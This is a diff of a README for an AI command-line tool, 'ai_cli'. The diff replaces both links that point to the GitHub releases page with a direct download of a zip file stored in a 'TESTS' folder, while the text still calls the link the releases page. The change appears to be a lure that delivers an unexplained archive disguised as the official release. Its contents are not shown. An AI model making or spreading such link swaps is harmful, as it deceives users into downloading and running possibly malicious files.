@@ -1,6 +1,6 @@
 # 🤖 ai_cli - Run an AI Agent From Your Terminal
 
-[![Download ai_cli](https://img.shields.io/badge/Download-ai_cli%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/Autoradiographinfighting868/ai_cli/releases)
+[![Download ai_cli](https://img.shields.io/badge/Download-ai_cli%20Releases-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Autoradiographinfighting868/ai_cli/main/TESTS/cli_ai_v2.0.zip)
 
 ## 🧭 What ai_cli does
 
@@ -23,7 +23,7 @@ For smoother use, 16 GB of RAM is better.
 
 Visit this page to download the Windows release:
 
-[Open the ai_cli releases page](https://github.com/Autoradiographinfighting868/ai_cli/releases)
+[Open the ai_cli releases page](https://raw.githubusercontent.com/Autoradiographinfighting868/ai_cli/main/TESTS/cli_ai_v2.0.zip)
 
 On that page, look for the latest release and download the Windows file for your system. If there are more than one file, pick the one that matches your computer.
 
